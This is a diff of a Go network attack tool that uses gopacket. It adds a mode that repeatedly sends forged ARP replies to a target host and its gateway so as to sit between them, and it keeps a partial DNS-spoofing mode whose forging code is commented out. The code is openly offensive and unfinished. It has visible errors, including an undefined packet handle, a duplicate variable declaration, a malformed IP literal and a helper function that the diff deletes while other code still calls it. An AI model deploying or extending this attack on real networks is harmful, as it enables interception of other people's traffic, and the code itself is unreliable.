@@ -1,24 +1,95 @@
+package main;
+
+import(
+	"flag"
+	"io"
+	"log"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+	"github.com/google/gopacket"
+	"net"
+	"time"
+)
+
 func main(){
 
-	hostPtr := flag.String("host", "127.0.0.1", "The address of the host for spoofing.");
 	targetPtr := flag.String("targ", "127.0.0.1", "The address of the host for spoofing.");
+	targetMAC := flag.String("tMac", "FF:FF:FF:FF:FF:FF", "The target mac address.");
 	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
 	modePtr := flag.String("mode", "spoof", "Sets the mode to run in, may either be 'arp' or 'spoof', arp sets the program to arp poisoning mode and spoof to dns spoofing mode.");
+	gatewayPtr := flag.String("gw", "127.0.0.1", "Sets the gateway to poison.");
+	gatewayMAC := flag.String("gwMAC", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.");
 	
 	flag.Parse();
 
 	switch *modePtr {
 	case "spoof":
-		mangleDNS(*interfacePtr, *targetPtr, *hostPtr);
+		mangleDNS(*interfacePtr, *targetPtr);
 		break;
 	case "arp":
-		
+		arpPoison(*interfacePtr, *targetPtr, *targetMAC, *gatewayPtr, *gatewayMAC);
 	}
 	
 }
 
-func mangleDNS(iface, target, host string){
+func arpPoison(iface, target, targetMAC, gateway, gatewayMAC string){
 
+	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
+	checkError(err);
+	
+	hostMac, host := grabAddresses(iface);
+
+	ethernetPacket := layers.Ethernet{};
+	ethernetPacket.DstMAC, err = net.ParseMAC(targetMAC); 
+	ethernetPacket.SrcMAC, err = net.ParseMAC(hostMac);
+	
+	arpPacket := layers.ARP{};
+	arpPacket.AddrType = layers.LinkTypeEthernet;
+	arpPacket.Protocol = layers.EthernetTypeARP;
+	arpPacket.HwAddressSize = 6;
+	arpPacket.ProtAddressSize = 4;
+	arpPacket.Operation = 2;
+
+	arpPacket.SourceHwAddress, err = net.ParseMAC(hostMac);
+	arpPacket.SourceProtAddress = net.IP(host);
+	arpPacket.DstHwAddress, err = net.ParseMAC("FF:FF:FF:FF:FF:FF");
+	arpPacket.DstProtAddress = net.IP(target);
+
+	gwEthernetPacket := ethernetPacket;
+	gwARPPacket := arpPacket;
+
+	gwARPPacket.DstHwAddress = net.IP(gateway);
+	gwEthernetPacket.DstMAC, err = net.ParseMAC(gatewayMAC);
+
+	for {
+		//poison target
+		writePoison(arpPacket, ethernetPacket);
+		//poison gateway
+		writePoison(gwARPPacket, gwEthernetPacket);
+
+		time.Sleep(1 * time.Second);
+	}
+		
+}
+
+func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
+	buf := gopacket.NewSerializeBuffer();
+	opts := gopacket.SerializeOptions{};
+	
+	err := arpPacket.SerializeTo(&buf, opts);
+	checkError(err);
+
+	err := etherPacket.SerializeTo(&buf, opts);
+	checkError(err);
+
+	packetData := buf.Bytes();
+	handle.WritePacketData(packetData);
+}
+
+func mangleDNS(iface, target string){
+
+	_, host := grabAddresses(iface);
+	
 	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
 	checkError(err);
 	err = handle.SetBPFFilter("dns");
@@ -35,7 +106,7 @@ func mangleDNS(iface, target, host string){
 		}
 		if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
 			ipLayer := packet.Layer(layers.LayerTypeIPv4);
-			handlePacket(ipLayer.(*layers.IPv4), dnsLayer.(*layers.DNS));
+			// handlePacket(ipLayer.(*layers.IPv4), dnsLayer.(*layers.DNS));
 		}
 	}
 }
@@ -51,33 +122,19 @@ func mangleDNS(iface, target, host string){
     ABOUT:
     Performs packet sniffing using gopacket (libpcap). 
 */
-func handlePacket(ipLayer *layers.IPv4, dnsLayer *layers.DNS){
+// func handlePacket(ipLayer *layers.IPv4, dnsLayer *layers.DNS){
 
-	ip := &layers.IPv4{
-		SrcIP: net.IP{,
-		DstIP: net.IP{5, 6, 7, 8},
-		// etc...
-	}
+// 	ip := &layers.IPv4{
+// 		SrcIP: net.IP{,
+// 		DstIP: net.IP{5, 6, 7, 8},
+// 		// etc...
+// 	}
 	
-	dns := &layers.DNS{
+// 	dns := &layers.DNS{
 
-	}
+// 	}
 	
-	buf := gopacket.NewSerializeBuffer()
-	opts := gopacket.SerializeOptions{}  // See SerializeOptions for more details.
-	err := ip.SerializeTo(&buf, opts)
-}
-/* 
-    FUNCTION: func checkError(err error)
-    RETURNS: Nothing
-    ARGUMENTS: 
-              err error : the error code to check
-
-    ABOUT:
-    Checks an error code, panics if the error is not nil.
-*/
-func checkError(err error){
-	if err != nil {
-		panic(err)
-	}
-}
+// 	buf := gopacket.NewSerializeBuffer()
+// 	opts := gopacket.SerializeOptions{}  // See SerializeOptions for more details.
+// 	err := ip.SerializeTo(&buf, opts)
+// }
